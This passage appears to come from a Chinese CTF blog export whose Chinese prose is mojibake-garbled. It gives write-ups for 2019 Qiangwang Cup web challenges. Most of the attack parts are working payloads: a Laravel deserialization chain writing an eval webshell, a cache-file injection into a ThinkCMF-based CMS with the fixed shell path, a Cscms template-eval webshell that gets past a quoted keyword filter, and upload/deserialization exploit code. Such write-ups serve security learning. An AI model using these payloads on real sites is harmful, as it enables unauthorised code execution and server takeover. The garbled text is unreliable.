<span class="class"><span class="keyword">class</span> <span class="title">Application</span></span>&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $hasBeenBootstrapped = <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">		<span class="keyword">protected</span> $bindings;</span></span><br><span class="line"></span><br><span class="line"><span class="php">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span>&#123;</span></span><br><span class="line"><span class="php">			<span class="keyword">$this</span>-&gt;bindings=$bind;</span></span><br><span class="line"><span class="php">		&#125;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><strong>rce.php</strong>ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"get.php"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="string">"system"</span>,<span class="keyword">array</span>(<span class="string">'echo "&lt;?php eval(\$_REQUEST[Cyc1e]);?&gt;" &gt; index.php'</span>),<span class="keyword">new</span> Illuminate\Auth\GenericUser(<span class="keyword">array</span>(<span class="string">"expectedOutput"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>),<span class="string">"expectedQuestions"</span>=&gt;<span class="keyword">array</span>(<span class="string">"0"</span>=&gt;<span class="string">"1"</span>))),<span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>))))));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>GETæ–¹å¼æŠŠpayloadæ‰“è¿‡å»å°±å¥½äº†</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">URLï¼š/index.php/<span class="keyword">index</span>?code=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A50%3A%22echo+%22%3C%3Fphp+<span class="keyword">eval</span>%28%5C%24_REQUEST%5Bpass%5D%29%3B%3F%3E%22+%3E+index.php%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>



<h1 id="0x02-YxtCmf"><a href="#0x02-YxtCmf" class="headerlink" title="0x02 YxtCmf"></a>0x02 YxtCmf</h1><p>ç¬¬ä¸€å¤©çš„ä¸‹åˆä¸€ç›´åœ¨å®¡è¿™ä¸ªcmfæ¡†æ¶çš„æºç ï¼Œæ˜¯åŸºäºThinkPhpæ¡†æ¶è¿›è¡ŒäºŒæ¬¡å¼€å‘çš„ï¼Œthinphpçš„ç¼“å­˜æœºåˆ¶ç®—æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ï¼Œä¸»è¦æ€è·¯æ˜¯é€šè¿‡æ§åˆ¶ç¼“å­˜æ–‡ä»¶æ¥æ‹¿shellï¼ŒæŸ¥çœ‹thinkcmfçš„ä¸€ä¸ªæ–‡æ¡£<br><img src="/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/8418106-d33cace0a96442b9.png" alt><br>è®¾ç½®äº†åŠ¨æ€æ›´æ–°ç³»ç»Ÿé…ç½®çš„å‡½æ•°ï¼ŒæŸ¥çœ‹ä¸€ä¸‹sp_set_dynamic_configå‡½æ•°çš„å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sp_set_dynamic_config</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!is_array($data))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(sp_is_sae())&#123;</span><br><span class="line">		$kv = <span class="keyword">new</span> SaeKV();</span><br><span class="line">		$ret = $kv-&gt;init();</span><br><span class="line">		$configs=$kv-&gt;get(<span class="string">"THINKCMF_DYNAMIC_CONFIG"</span>);</span><br><span class="line">		$configs=<span class="keyword">empty</span>($configs)?<span class="keyword">array</span>():unserialize($configs);</span><br><span class="line">		$configs=array_merge($configs,$data);</span><br><span class="line">		$result = $kv-&gt;set(<span class="string">'THINKCMF_DYNAMIC_CONFIG'</span>, serialize($configs));</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(defined(<span class="string">'IS_BAE'</span>) &amp;&amp; IS_BAE)&#123;</span><br><span class="line">		$bae_mc=<span class="keyword">new</span> BaeMemcache();</span><br><span class="line">		$configs=$bae_mc-&gt;get(<span class="string">"THINKCMF_DYNAMIC_CONFIG"</span>);</span><br><span class="line">		$configs=<span class="keyword">empty</span>($configs)?<span class="keyword">array</span>():unserialize($configs);</span><br><span class="line">		$configs=array_merge($configs,$data);</span><br><span class="line">		$result = $bae_mc-&gt;set(<span class="string">"THINKCMF_DYNAMIC_CONFIG"</span>,serialize($configs),MEMCACHE_COMPRESSED,<span class="number">0</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$config_file=<span class="string">"./data/conf/config.php"</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists($config_file))&#123;</span><br><span class="line">			$configs=<span class="keyword">include</span> $config_file;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			$configs=<span class="keyword">array</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		$configs=array_merge($configs,$data);</span><br><span class="line">		$result = file_put_contents($config_file, <span class="string">"&lt;?php\treturn "</span> . var_export($configs, <span class="keyword">true</span>) . <span class="string">";"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	sp_clear_cache();</span><br><span class="line">	S(<span class="string">"sp_dynamic_config"</span>,$configs);</span><br><span class="line">	<span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŠŠ$configå’Œå­—ç¬¦ä¸²â€œTHINKCMF_DYNAMIC_CONFIGâ€ï¼Œä¼ å…¥äº†setå‡½æ•°ï¼Œsetå‡½æ•°æ˜¯ä¸€ä¸ªå†™å…¥ç¼“å­˜æ–‡ä»¶çš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æŠŠsp_set_dynamic_configä¼ å…¥çš„å›ºå®šå­—ç¬¦ä¸²å¤„ç†åå½“ä½œæ–‡ä»¶åç”Ÿæˆï¼Œä¼ å…¥çš„$configçš„æ•°æ®ä¸ºç¼“å­˜æ–‡ä»¶çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´æ§åˆ¶äº†ç¼“å­˜å†…å®¹åœ¨æ‹¿åˆ°ç¼“å­˜æ–‡ä»¶åå°±å¯ä»¥æ§åˆ¶ç¼“å­˜æ–‡ä»¶äº†ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯æ‰¾å“ªä¸€ä¸ªsp_set_dynamic_configå‡½æ•°æˆ‘ä»¬å¯ä»¥ç”¨ï¼Œå› ä¸ºé¢˜ç›®ç¯å¢ƒè®¾å®šæ˜¯æŠŠadminã€installç­‰ç›®å½•ç»™å»äº†ï¼Œä¹Ÿå°±é™åˆ¶äº†åˆ©ç”¨è®¿é—®ï¼Œæœ¬èœä¹ æƒ¯ç”¨notepad++,æ‰€ä»¥å…¨å±€æœç´¢sp_set_dynamic_configçš„è°ƒç”¨æƒ…å†µï¼Œå†æ’é™¤ä¸€ä¸‹ï¼Œæœ€ç»ˆç¡®å®šäº†\application\Api\Controller\OauthController.class.phpä¸­çš„sp_set_dynamic_configå¯ä»¥ä»»æ„æ§åˆ¶</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">injectionAuthocode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="symbol">$postdata</span>=I(<span class="string">'post.'</span>);</span><br><span class="line">        <span class="symbol">$co</span>nfigs[<span class="string">"authoCode"</span>]=<span class="symbol">$postdata</span>[<span class="string">'authoCode'</span>];</span><br><span class="line">        sp_set_dynamic_config(<span class="symbol">$co</span>nfigs);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>ç¼“å­˜æ–‡ä»¶é‡Œçš„å†…å®¹æ˜¯æ³¨é‡Šåçš„åºåˆ—åŒ–å€¼ï¼Œæ‰€ä»¥æ„é€ ä¸€ä¸‹postå€¼æ¢è¡Œå†æ³¨é‡Šåé¢çš„è¯­å¥å°±å¯ä»¥å†™å…¥ä»»æ„ä»£ç äº†</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">POSTï¼šauthoCode=Cyc<span class="number">1</span>e<span class="meta">%</span><span class="number">0</span>aeval<span class="comment">($_REQUEST[pass])</span>;<span class="comment">//</span></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å°±æ˜¯ç¼“å­˜æ–‡ä»¶åçš„é—®é¢˜äº†ï¼ˆæ¯•ç«Ÿç¼“å­˜æ–‡ä»¶åæ˜¯ä¸ªmd5å€¼ï¼Œçˆ†ç ´æ˜¯ä¸å¯èƒ½çš„ï¼‰ï¼Œåˆ†æsetå‡½æ•°å³å¯ï¼Œå‘ç°å°±æ˜¯ä¸¤ä¸ªå›ºå®šçš„å­—ç¬¦ä¸²æ‹¼æ¥å¤„ç†ï¼Œæ‰€ä»¥è¿™å°±æ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼äº†ï¼Œç¼“å­˜çš„æ–‡ä»¶åå›ºå®šä¸ºed182ead0631e95e68e008bc1d3af012.phpï¼Œæœ¬åœ°ç”Ÿæˆäº†ç›´æ¥ä¸Šå°æ‰“å°±è¡Œäº†ï¼Œç¬¬ä¸€å¤©ä¸‹åˆå°±åˆ†æåˆ°è¿™ï¼Œå¡åœ¨äº†è·¯ç”±è§¦å‘è§„åˆ™ä¸Šï¼Œå¤§å†™çš„å°´å°¬ï¼Œåˆ°é…’åº—ç»§ç»­çœ‹äº†ä¸‹ï¼Œæ˜¯è‡ªå·±å‚»äº†ï¼Œè·¯ç”±è§„åˆ™çœ‹é”™äº†ï¼Œæ‰€ä»¥æœ€åçš„payload<br> <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">URLï¼š<span class="regexp">/index.php/</span>api<span class="regexp">/oauth/i</span>njectionAuthocode</span><br><span class="line">POSTï¼šauthoCode=Cyc1e%<span class="number">0</span>aeval(<span class="variable">$_REQUEST</span>[Cyc1e]);<span class="regexp">//</span></span><br><span class="line">PATHï¼š<span class="regexp">/data/</span>runtime<span class="regexp">/Temp/</span>ed182ead0631e95e68e008bc1d3af012.php</span><br></pre></td></tr></table></figure><br>ç›´æ¥è§¦å‘å°±å¥½äº†</p>
<p><img src="https://upload-images.jianshu.io/upload_images/8418106-b6dc48cf00e8f738.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<h1 id="0x03-Cscms"><a href="#0x03-Cscms" class="headerlink" title="0x03 Cscms"></a>0x03 Cscms</h1><p>è¿™é¢˜æ™šä¸Šæ‰å¼€å§‹å®¡ï¼ŒæŸ¥äº†ä¸‹æœ€è¿‘æŠ¥å‡ºçš„æ´ï¼Œå‘ç°è¿™ä¸ªcmså¥½åƒæ˜¯å‡‰äº†çš„ï¼Œæœ€è¿‘çš„ä¹Ÿå°±æ˜¯17å¹´çš„äº†ï¼Œæœ‰ä¸€ä¸ªSSTIçš„è¡¥ä¸ï¼Œè€Œä¸”æ€ä¹ˆæ‰¾åˆ°æ‰¾ä¸åˆ°è¿™ä¸ªè¡¥ä¸çš„ä»£ç ï¼Œå°±é¡ºç€è¿™ä¸ªæ€è·¯å»äº†ï¼Œæ—¢ç„¶ä¸è®©æˆ‘æ‰¾åˆ°ï¼Œé‚£ä¼°è®¡å°±æœ‰é—®é¢˜çš„å˜›ï¼Œ2333ï¼Œè¿™é¢˜ç»™çš„é¢˜ç›®ä¿¡æ¯ä¸€æ ·æ˜¯åˆ é™¤äº†adminã€installç›®å½•ï¼Œæ‰€ä»¥ä¸€æ ·æ˜¯å‰å°çš„æ´äº†ï¼Œæ—¢ç„¶æ˜¯SSTIï¼Œé‚£è‚¯å®šæ˜¯æœ‰ä¸€ä¸ªä»£ç æ‰§è¡Œç‚¹çš„ï¼Œå…¨å±€æœç´¢evalå‡½æ•°ï¼Œæœ€ç»ˆå®šä½åˆ°<br>\cscms\app\models\Csskins.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// phpæ ‡ç­¾å¤„ç†</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cscms_php</span><span class="params">($php,$content,$str)</span> </span>&#123;</span><br><span class="line">        $evalstr=<span class="string">" return $content"</span>;</span><br><span class="line">	    $newsphp=<span class="keyword">eval</span>($evalstr);</span><br><span class="line">        $str=str_replace($php,$newsphp,$str);</span><br><span class="line">	    <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åªè¦æ§åˆ¶äº†$contentï¼Œå°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œè¿›è¡Œå‡½æ•°çš„å›æº¯ï¼Œè¿™ä¸ªæœ€éš¾å—äº†ï¼Œå°±ä¸€ä¸ªtemplate_parseå‡½æ•°è°ƒç”¨äº†cscms_phpï¼Œå®šä½phpå¤„ç†ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PHPä»£ç è§£æ</span></span><br><span class="line">preg_match_all(<span class="string">'/&#123;cscmsphp&#125;([\s\S]+?)&#123;\/cscmsphp&#125;/'</span>,$str,$php_arr);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($php_arr[<span class="number">0</span>]))&#123;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($php_arr[<span class="number">0</span>]);$i++)&#123;</span><br><span class="line">	      $str=<span class="keyword">$this</span>-&gt;cscms_php($php_arr[<span class="number">0</span>][$i],$php_arr[<span class="number">1</span>][$i],$str);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($php_arr);</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´æ­£åˆ™åŒ¹é…{cscmsphp}([\s\S]+?){/cscmsphp}ï¼ŒæŠŠåŒ¹é…åˆ°çš„æ•°æ®ä¼ ç»™cscms_phpï¼Œå†åˆ©ç”¨evalç›´æ¥æ‰§è¡Œï¼Œåˆ†æåˆ°è¿™é€»è¾‘å°±å¾ˆæ¸…æ™°äº†ï¼Œå°±æ˜¯è¦æ‰¾ä¸€ä¸ªå‰å°çš„è°ƒç”¨äº†template_parseå‡½æ•°çš„åœ°æ–¹ï¼Œæ§åˆ¶è¾“å…¥çš„å†…å®¹ï¼Œå°±å¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œï¼Œå…¨å±€æœç´¢è°ƒç”¨æƒ…å†µï¼Œå®šä½ä¸€ä¸ªå¥½è°ƒç”¨çš„åœ°æ–¹ï¼š\plugins\sys\home\Gbook.phpï¼ˆæ„è§ç•™è¨€æ¿ï¼Œä¸ç”¨ä»»ä½•æƒé™ç›´æ¥è§¦å‘ï¼‰ï¼Œå…¶ä¸­çš„ajaxå‡½æ•°å¯¹å…¶è¿›è¡Œäº†è°ƒç”¨</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Mark_Text</span>=<span class="variable">$this</span>-&gt;Csskins-&gt;template_parse(<span class="variable">$Mark_Text</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è·å–åˆ°ç•™è¨€æ¿è¾“å…¥çš„å†…å®¹ï¼Œä¼ å…¥åˆ°template_parseå‡½æ•°ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ ç•™è¨€æ•°æ®çš„æ—¶å€™ï¼ŒåŠ ä¸Š{cscmsphp}{/cscmsphp}ä¾¿ç­¾å°±ä¼šä¼ åˆ°evalå‡½æ•°ä¸­ï¼Œæµ‹è¯•äº†ä¸‹eval($_REQUEST[Cyc1e]);ï¼Œç„¶åå¤±è´¥äº†ï¼Œå°½ç„¶è¿˜æœ‰è½¬ä¹‰ï¼Œä¹Ÿæ˜¯å¾ˆæœ‰æ„æ€ï¼Œæ‰¾åˆ°å¤„ç†ä»£ç ã€‚<br> <figure class="highlight leaf"><table><tr><td class="code"><pre><span class="line">$str = preg_replace('<span class="function"><span class="keyword">#</span><span class="params">(<span class="variable">alert</span>|<span class="variable">prompt</span>|<span class="variable">confirm</span>|<span class="variable">cmd</span>|<span class="variable">passthru</span>|<span class="variable">eval</span>|<span class="variable">exec</span>|<span class="variable">expression</span>|<span class="variable">system</span>|<span class="variable">fopen</span>|<span class="variable">fsockopen</span>|<span class="variable">file</span>|<span class="variable">file_get_contents</span>|<span class="variable">readfile</span>|<span class="variable">unlink</span>)</span></span>(\s*)\((.*?)\)#si','\\1\\2&amp;#40;\\3&amp;#41;',$str);</span><br></pre></td></tr></table></figure><br>å°±è¿‡æ»¤äº†è¿™å‡ ä¸ªï¼Œæ‰€ä»¥æ„é€ ä¸‹payloadï¼š</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">URLï¼š<span class="keyword">index</span>.php/gbook</span><br><span class="line">ç•™è¨€æ•°æ®ï¼š&#123;cscmsphp&#125;assert($_REQUEST[Cyc1e]);&#123;/cscmsphp&#125;</span><br><span class="line">Shellï¼š/<span class="keyword">index</span>.php/gbook/lists/<span class="number">1</span>?Cyc1e=phpinfo();</span><br></pre></td></tr></table></figure>
<p><img src="/2019/06/16/%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%86%B3%E8%B5%9BRW%E7%9A%843%E4%B8%AAWeb%E9%A2%98/8418106-9f563edeb5d07a5b.png" alt></p>
<h3 id="0x04-å°ç»“"><a href="#0x04-å°ç»“" class="headerlink" title="0x04 å°ç»“"></a>0x04 å°ç»“</h3><p>æ€»çš„æ¥è¯´ï¼Œç¥ä»™æ‰“æ¶ï¼ŒWebç‹—æ²¡å‰é€”ï¼Œç¥ä»™ä»¬éƒ½ä¸åœ¨æ„Webçš„é‚£ä¸€ä¸¢ä¸¢åˆ†</p>
]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>RealWorld</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 å¼ºç½‘æ¯éƒ¨åˆ†Webé¢˜åŠè§£é¢˜æ€è·¯</title>
    <url>/2019/05/31/2019-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Web%E9%A2%98%E5%8F%8A%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h3 id="0x01-upload"><a href="#0x01-upload" class="headerlink" title="0x01 upload"></a>0x01 upload</h3><p>æ‰«æå¾—åˆ°æºç æ–‡ä»¶ï¼š<a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a>ï¼Œæ‰€ä»¥è¿™é“é¢˜ç›®ä¸»è¦å°±æ˜¯ä»£ç å®¡è®¡çš„å·¥ä½œï¼Œç½‘ç«™çš„ä¸»ä½“åŠŸèƒ½ä»£ç åœ¨ï¼šapplication\webï¼Œæ¼æ´è§¦å‘ç‚¹åœ¨Porfile</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($<span class="keyword">this</span>-&gt;ext) &#123;	<span class="keyword">if</span>(getimagesize($<span class="keyword">this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">	@copy($<span class="keyword">this</span>-&gt;filename_tmp, $<span class="keyword">this</span>-&gt;filename);</span><br><span class="line">	@unlink($<span class="keyword">this</span>-&gt;filename_tmp);	</span><br><span class="line">	$<span class="keyword">this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;	</span><br><span class="line">	$<span class="keyword">this</span>-&gt;update_img();	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	$<span class="keyword">this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;	</span><br><span class="line">        $<span class="keyword">this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´å¦‚æœextä¸º1çš„è¯ï¼Œå°±ä¼šæ‰§è¡Œcopyæ“ä½œï¼ŒæŠŠæœ€åˆä¸Šä¼ çš„æ–‡ä»¶copyé‡å‘½åä¸ºfilenameï¼Œæ‰€ä»¥åˆ©ç”¨é€»è¾‘å°±æ˜¯ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡æœ¨é©¬ï¼Œç„¶åå‡ºå‘copyæ›´åä¸ºä¸€ä¸ª.phpæ–‡ä»¶å°±è¡Œäº†ã€‚</p>
<p>ç™»å½•ååœ¨INDEX.phpæ–‡ä»¶ä¸­å¯¹cookieè¿›è¡Œäº†ååºåˆ—åŒ–æ“ä½œï¼Œåœ¨Registerç±»ä¸­å®ä¾‹åŒ–äº†Profileç±»ï¼Œæ‰€ä»¥æœ€ç»ˆçš„æ¼æ´åˆ©ç”¨é€»è¾‘ï¼š</p>
<ol>
<li>æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»å½•åä¸Šä¼ ä¸€å¼ å›¾ç‰‡æœ¨é©¬ã€‚</li>
<li>æ„é€ åºåˆ—åŒ–ï¼Œå®ä¾‹åŒ–Registerï¼Œåœ¨Registerä¸­å®ä¾‹åŒ–Profileï¼Œå°†extè®¾ç½®ä¸º1ï¼Œfilename_tmpä¸ºä¸Šä¼ çš„å›¾ç‰‡åœ°å€ï¼Œfilenameè®¾ç½®ä¸ºphpåç§°ï¼Œexceptè®¾ç½®ä¸ºarray(â€˜indexâ€™=&gt;â€™upload_imgâ€™)ã€‚</li>
<li>ç™»å½•å¸å·ï¼Œå°†cookieä¿®æ”¹ä¸ºæ„é€ åºåˆ—åŒ–è¾“å‡ºçš„å¹¶base64ç¼–ç çš„æ•°æ®ï¼Œç›´æ¥è¯·æ±‚è§¦å‘å°±å¯ä»¥è§¦å‘æ¼æ´ã€‚</li>
</ol>
<p>è¿™é‡Œç›´æ¥è´´exp</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//include('Index.php');</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename_tmp;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $ext;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $except;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span></span><br><span class="line"><span class="php">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;update_img();</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $checker;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $registed;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span></span><br><span class="line"><span class="php">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span></span><br><span class="line"><span class="php">                <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(input(<span class="string">"post.username"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.email"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.password"</span>))) &#123;</span></span><br><span class="line"><span class="php">            $email = input(<span class="string">"post.email"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span></span><br><span class="line"><span class="php">            $password = input(<span 